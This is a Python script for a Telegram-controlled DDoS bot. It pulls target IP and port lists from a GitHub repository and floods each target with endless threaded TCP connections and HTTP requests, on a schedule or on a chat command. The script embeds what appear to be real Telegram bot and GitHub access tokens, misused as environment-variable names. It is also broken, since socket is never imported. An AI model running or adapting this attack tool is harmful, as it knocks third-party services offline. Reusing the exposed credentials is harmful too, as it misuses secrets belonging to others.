import os
import requests
import threading
import telebot
import time
from datetime import datetime

# Retrieve environment variables set in install.sh
TELEGRAM_BOT_TOKEN = os.getenv("7631449307:AAF46hm7WpyjIUH6hIqJOTD4RiWpgPxF9x4")
CHAT_ID = os.getenv("6522295816")
GITHUB_TOKEN = os.getenv("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")
REPO_URL = "https://api.github.com/repos/thakurgulzar3/repo/contents/data.txt"  # Replace with your repo URL

# Initialize the Telegram bot
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Schedule times (24-hour format)
scheduled_times = ["12:00", "18:00"]  # Schedule attacks at 12:00 and 18:00

# Function to fetch IPs and Ports from GitHub
def fetch_targets_from_github():
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3.raw",
    }
    response = requests.get(REPO_URL, headers=headers)
    if response.status_code == 200:
        # Parse each line as IP and Port
        targets = []
        for line in response.text.strip().splitlines():
            ip, port = line.split()
            targets.append((ip, int(port)))
        return targets
    else:
        bot.send_message(CHAT_ID, "Failed to fetch targets from GitHub.")
        return []

# DDoS attack function
def ddos_attack(ip, port):
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendto(b"GET / HTTP/1.1\r\n", (ip, port))
            sock.sendto(b"Host: " + ip.encode() + b"\r\n\r\n", (ip, port))
            sock.close()
            bot.send_message(CHAT_ID, f"Request sent to {ip}:{port}")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error on {ip}:{port} - {e}")

# Main function to schedule DDoS attacks
def schedule_ddos():
    targets = fetch_targets_from_github()
    bot.send_message(CHAT_ID, f"Fetched {len(targets)} targets for DDoS.")
    
    while True:
        # Get the current time in HH:MM format
        current_time = datetime.now().strftime("%H:%M")
        
        # If the current time matches any scheduled time
        if current_time in scheduled_times:
            bot.send_message(CHAT_ID, f"Starting DDoS attack at {current_time}")
            
            for ip, port in targets:
                thread = threading.Thread(target=ddos_attack, args=(ip, port))
                thread.start()
                time.sleep(1)  # Delay to control thread start time

            # Sleep for 60 seconds to avoid retriggering the attack within the same minute
            time.sleep(60)
        else:
            # Sleep for 10 seconds before checking the time again
            time.sleep(10)

# Define bot command to manually trigger DDoS attack
@bot.message_handler(commands=['start_ddos'])
def handle_start_ddos(message):
    bot.send_message(message.chat.id, "Manual DDoS attack triggered.")
    schedule_ddos()

# Polling the bot for commands
print("Bot is running...")
bot.polling()
